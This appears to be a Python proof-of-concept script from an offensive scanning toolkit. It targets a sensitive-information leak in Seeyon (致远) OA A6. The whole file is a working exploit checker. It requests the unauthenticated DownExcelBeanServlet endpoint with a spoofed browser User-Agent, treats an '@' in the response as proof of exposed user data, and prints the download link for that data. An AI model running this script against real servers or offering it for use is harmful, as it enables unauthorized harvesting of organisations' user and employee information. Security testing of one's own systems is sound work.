import time
import requests
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    console.print(now_time() + " [INFO]     正在检测致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞", style='bold blue')
    ##console.print(now_time() + " [INFO]     正在请求 {}".format(vuln_url), style='bold blue')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(vuln_url, headers=headers, timeout=5)
        if "@" in response.text and response.status_code == 200:
            console.print(
                now_time() + " [SUCCESS]  目标存在致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞, 下载地址: {}".format(vuln_url),
                style='bold green')
        else:
            console.print(now_time() + " [WARNING]  致远OA A6 DownExcelBeanServlet 用户敏感信息下载漏洞利用失败", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')



